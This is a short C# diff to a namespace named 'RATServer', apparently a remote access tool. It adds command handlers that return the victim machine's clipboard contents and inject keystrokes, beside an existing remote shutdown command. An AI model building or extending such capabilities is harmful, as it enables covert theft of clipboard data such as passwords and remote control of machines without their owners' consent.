@@ -94,7 +94,16 @@ namespace RATServer
                             Functions.ShutDown();
                             r.Type = "Message";
                             r.Msg = "Shutdown Success";
-                            break;                   
+                            break;
+                        case "clipboard":
+                            r.Type = "Message";
+                            r.Msg = Functions.ClipBoard();
+                            break;
+                        case "sendkeys":
+                            Functions.KeyPress(c.Args[0]);
+                            r.Type = "Message";
+                            r.Msg = "SendKeys Success";
+                            break;
                         default:
                             break;
                     }                 
